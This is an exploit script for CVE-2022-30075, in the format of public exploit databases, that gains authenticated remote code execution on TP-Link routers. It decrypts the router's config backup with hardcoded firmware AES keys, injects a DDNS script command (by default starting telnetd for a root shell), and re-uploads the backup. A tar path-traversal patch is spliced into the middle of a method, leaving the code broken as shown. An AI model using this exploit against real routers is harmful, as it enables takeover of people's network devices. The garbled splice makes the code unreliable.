#!/usr/bin/python3
# Exploit Title: TP-Link Routers - Authenticated Remote Code Execution
# Exploit Author: Tomas Melicher
# Technical Details: https://github.com/aaronsvk/CVE-2022-30075
# Date: 2022-06-08
# Vendor Homepage: https://www.tp-link.com/
# Tested On: Tp-Link Archer AX50
# Vulnerability Description:
#   Remote Code Execution via importing malicious config file

import argparse # pip install argparse
import requests # pip install requests
import binascii, base64, os, re, json, sys, time, math, random, hashlib
import tarfile, zlib
from Crypto.Cipher import AES, PKCS1_v1_5, PKCS1_OAEP # pip install pycryptodome
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes
from urllib.parse import urlencode

class WebClient(object):

	def __init__(self, target, password):
		self.target = target
		self.password = password.encode('utf-8')
		self.password_hash = hashlib.md5(('admin%s'%password).encode('utf-8')).hexdigest().encode('utf-8')
		self.aes_key = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')
		self.aes_iv = (str(time.time()) + str(random.random())).replace('.','')[0:AES.block_size].encode('utf-8')

		self.stok = ''
		self.session = requests.Session()

		data = self.basic_request('/login?form=auth', {'operation':'read'})
		if data['success'] != True:
			print('[!] unsupported router')
			return
		self.sign_rsa_n = int(data['data']['key'][0], 16)
		self.sign_rsa_e = int(data['data']['key'][1], 16)
		self.seq = data['data']['seq']

		data = self.basic_request('/login?form=keys', {'operation':'read'})
		self.password_rsa_n = int(data['data']['password'][0], 16)
		self.password_rsa_e = int(data['data']['password'][1], 16)

		self.stok = self.login()


	def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = pad(plaintext, aes_block_size)
		return cipher.encrypt(plaintext_padded)


	def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = cipher.decrypt(ciphertext)
		plaintext = unpad(plaintext_padded, aes_block_size)
		return plaintext


	def rsa_encrypt(self, n, e, plaintext):
		public_key = RSA.construct((n, e)).publickey()
		encryptor = PKCS1_v1_5.new(public_key)
		block_size = int(public_key.n.bit_length()/8) - 11
		encrypted_text = ''
		for i in range(0, len(plaintext), block_size):
			encrypted_text += encryptor.encrypt(plaintext[i:i+block_size]).hex()
		return encrypted_text


	def download_request(self, url, post_data):
		res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data=post_data, stream=True)
		filepath = os.getcwd()+'/'+re.findall(r'(?<=filename=")[^"]+', res.headers['Content-Disposition'])[0]
		if os.path.exists(filepath):
			print('[!] can\'t download, file "%s" already exists' % filepath)
			return
		with open(filepath, 'wb') as f:
			for chunk in res.iter_content(chunk_size=4096):
				f.write(chunk)
		return filepath


	def basic_request(self, url, post_data, files_data={}):
		res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data=post_data, files=files_data)
		return json.loads(res.content)


	def encrypted_request(self, url, post_data):
		serialized_data = urlencode(post_data)
		encrypted_data = self.aes_encrypt(self.aes_key, self.aes_iv, AES.block_size, serialized_data.encode('utf-8'))
		encrypted_data = base64.b64encode(encrypted_data)

		signature = ('k=%s&i=%s&h=%s&s=%d'.encode('utf-8')) % (self.aes_key, self.aes_iv, self.password_hash, self.seq+len(encrypted_data))
		encrypted_signature = self.rsa_encrypt(self.sign_rsa_n, self.sign_rsa_e, signature)

		res = self.session.post('http://%s/cgi-bin/luci/;stok=%s%s'%(self.target,self.stok,url), data={'sign':encrypted_signature, 'data':encrypted_data}) # order of params is important
		if(res.status_code != 200):
			print('[!] url "%s" returned unexpected status code'%(url))
			return
		encrypted_data = json.loads(res.content)
		encrypted_data = base64.b64decode(encrypted_data['data'])
		data = self.aes_decrypt(self.aes_key, self.aes_iv, AES.block_size, encrypted_data)
		return json.loads(data)


	def login(self):
		post_data = {'operation':'login', 'password':self.rsa_encrypt(self.password_rsa_n, self.password_rsa_e, self.password)}
		data = self.encrypted_request('/login?form=login', post_data)
		if data['success'] != True:
			print('[!] login failed')
			return
		print('[+] logged in, received token (stok): %s'%(data['data']['stok']))
		return data['data']['stok']



class BackupParser(object):

	def __init__(self, filepath):
		self.encrypted_path = os.path.abspath(filepath)
		self.decrypted_path = os.path.splitext(filepath)[0]

		self.aes_key = bytes.fromhex('2EB38F7EC41D4B8E1422805BCD5F740BC3B95BE163E39D67579EB344427F7836') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua
		self.iv = bytes.fromhex('360028C9064242F81074F4C127D299F6') # strings ./squashfs-root/usr/lib/lua/luci/model/crypto.lua


	def aes_encrypt(self, aes_key, aes_iv, aes_block_size, plaintext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = pad(plaintext, aes_block_size)
		return cipher.encrypt(plaintext_padded)


	def aes_decrypt(self, aes_key, aes_iv, aes_block_size, ciphertext):
		cipher = AES.new(aes_key, AES.MODE_CBC, iv=aes_iv)
		plaintext_padded = cipher.decrypt(ciphertext)
		plaintext = unpad(plaintext_padded, aes_block_size)
		return plaintext


	def encrypt_config(self):
		if not os.path.isdir(self.decrypted_path):
			print('[!] invalid directory "%s"'%(self.decrypted_path))
			return

		# encrypt, compress each .xml using zlib and add them to tar archive
		with tarfile.open('%s/data.tar'%(self.decrypted_path), 'w') as tar:
			for filename in os.listdir(self.decrypted_path):
				basename,ext = os.path.splitext(filename)
				if ext == '.xml':
					xml_path = '%s/%s'%(self.decrypted_path,filename)
					bin_path = '%s/%s.bin'%(self.decrypted_path,basename)
					with open(xml_path, 'rb') as f:
						plaintext = f.read()
					if len(plaintext) == 0:
						f = open(bin_path, 'w')
						f.close()
					else:
						compressed = zlib.compress(plaintext)
						encrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)
						with open(bin_path, 'wb') as f:
							f.write(encrypted)
					tar.add(bin_path, os.path.basename(bin_path))
					os.unlink(bin_path)
		# compress tar archive using zlib and encrypt
		with open('%s/md5_sum'%(self.decrypted_path), 'rb') as f1, open('%s/data.tar'%(self.decrypted_path), 'rb') as f2:
			compressed = zlib.compress(f1.read()+f2.read())
		encrypted = self.aes_encrypt(self.aes_key, self.iv, AES.block_size, compressed)
		# write into final config file
		with open('%s'%(self.encrypted_path), 'wb') as f:
			f.write(encrypted)
		os.unlink('%s/data.tar'%(self.decrypted_path))


	def decrypt_config(self):
		if not os.path.isfile(self.encrypted_path):
			print('[!] invalid file "%s"'%(self.encrypted_path))
			return

		# decrypt and decompress config file
		with open(self.encrypted_path, 'rb') as f:
			decrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, f.read())
		decompressed = zlib.decompress(decrypted)
		os.mkdir(self.decrypted_path)
		# store decrypted data into files
		with open('%s/md5_sum'%(self.decrypted_path), 'wb') as f:
			f.write(decompressed[0:16])
		with open('%s/data.tar'%(self.decrypted_path), 'wb') as f:
			f.write(decompressed[16:])
		# untar second part of decrypted data
		with tarfile.open('%s/data.tar'%(self.decrypted_path), 'r') as tar:

import os

def is_within_directory(directory, target):
	
	abs_directory = os.path.abspath(directory)
	abs_target = os.path.abspath(target)

	prefix = os.path.commonprefix([abs_directory, abs_target])
	
	return prefix == abs_directory

def safe_extract(tar, path=".", members=None, *, numeric_owner=False):

	for member in tar.getmembers():
		member_path = os.path.join(path, member.name)
		if not is_within_directory(path, member_path):
			raise Exception("Attempted Path Traversal in Tar File")

	tar.extractall(path, members, numeric_owner=numeric_owner) 
	

safe_extract(tar, path=self.decrypted_path)
		# decrypt and decompress each .bin file from tar archive
		for filename in os.listdir(self.decrypted_path):
			basename,ext = os.path.splitext(filename)
			if ext == '.bin':
				bin_path = '%s/%s'%(self.decrypted_path,filename)
				xml_path = '%s/%s.xml'%(self.decrypted_path,basename)
				with open(bin_path, 'rb') as f:
					ciphertext = f.read()
				os.unlink(bin_path)
				if len(ciphertext) == 0:
					f = open(xml_path, 'w')
					f.close()
					continue
				decrypted = self.aes_decrypt(self.aes_key, self.iv, AES.block_size, ciphertext)
				decompressed = zlib.decompress(decrypted)
				with open(xml_path, 'wb') as f:
					f.write(decompressed)
		os.unlink('%s/data.tar'%(self.decrypted_path))


	def modify_config(self, command):
		xml_path = '%s/ori-backup-user-config.xml'%(self.decrypted_path)
		if not os.path.isfile(xml_path):
			print('[!] invalid file "%s"'%(xml_path))
			return

		with open(xml_path, 'r') as f:
			xml_content = f.read()

		# https://openwrt.org/docs/guide-user/services/ddns/client#detecting_wan_ip_with_script
		payload = '<service name="exploit">\n'
		payload += '<enabled>on</enabled>\n'
		payload += '<update_url>http://127.0.0.1/</update_url>\n'
		payload += '<domain>x.example.org</domain>\n'
		payload += '<username>X</username>\n'
		payload += '<password>X</password>\n'
		payload += '<ip_source>script</ip_source>\n'
		payload += '<ip_script>%s</ip_script>\n' % (command.replace('<','&lt;').replace('&','&amp;'))
		payload += '<interface>internet</interface>\n' # not worked for other interfaces
		payload += '<retry_interval>5</retry_interval>\n'
		payload += '<retry_unit>seconds</retry_unit>\n'
		payload += '<retry_times>3</retry_times>\n'
		payload += '<check_interval>12</check_interval>\n'
		payload += '<check_unit>hours</check_unit>\n'
		payload += '<force_interval>30</force_interval>\n'
		payload += '<force_unit>days</force_unit>\n'
		payload += '</service>\n'

		if '<service name="exploit">' in xml_content:
			xml_content = re.sub(r'<service name="exploit">[\s\S]+?</service>\n</ddns>', '%s</ddns>'%(payload), xml_content, 1)
		else:
			xml_content = xml_content.replace('</service>\n</ddns>', '</service>\n%s</ddns>'%(payload), 1)
		with open(xml_path, 'w') as f:
			f.write(xml_content)



arg_parser = argparse.ArgumentParser()
arg_parser.add_argument('-t', metavar='target', help='ip address of tp-link router', required=True)
arg_parser.add_argument('-p', metavar='password', required=True)
arg_parser.add_argument('-b', action='store_true', help='only backup and decrypt config')
arg_parser.add_argument('-r', metavar='backup_directory', help='only encrypt and restore directory with decrypted config')
arg_parser.add_argument('-c', metavar='cmd', default='/usr/sbin/telnetd -l /bin/login.sh', help='command to execute')
args = arg_parser.parse_args()

client = WebClient(args.t, args.p)
parser = None

if not args.r:
	print('[*] downloading config file ...')
	filepath = client.download_request('/admin/firmware?form=config_multipart', {'operation':'backup'})
	if not filepath:
		sys.exit(-1)

	print('[*] decrypting config file "%s" ...'%(filepath))
	parser = BackupParser(filepath)
	parser.decrypt_config()
	print('[+] successfully decrypted into directory "%s"'%(parser.decrypted_path))

if not args.b and not args.r:
	filepath = '%s_modified'%(parser.decrypted_path)
	os.rename(parser.decrypted_path, filepath)
	parser.decrypted_path = os.path.abspath(filepath)
	parser.encrypted_path = '%s.bin'%(filepath)
	parser.modify_config(args.c)
	print('[+] modified directory with decrypted config "%s" ...'%(parser.decrypted_path))

if not args.b:
	if parser is None:
		parser = BackupParser('%s.bin'%(args.r.rstrip('/')))
	print('[*] encrypting directory with modified config "%s" ...'%(parser.decrypted_path))
	parser.encrypt_config()
	data = client.basic_request('/admin/firmware?form=config_multipart', {'operation':'read'})
	timeout = data['data']['totaltime'] if data['success'] else 180
	print('[*] uploading modified config file "%s"'%(parser.encrypted_path))
	data = client.basic_request('/admin/firmware?form=config_multipart', {'operation':'restore'}, {'archive':open(parser.encrypted_path,'rb')})
	if not data['success']:
		print('[!] unexpected response')
		print(data)
		sys.exit(-1)

	print('[+] config file successfully uploaded')
	print('[*] router will reboot in few seconds... when it becomes online again (few minutes), try "telnet %s" and enjoy root shell !!!'%(args.t))
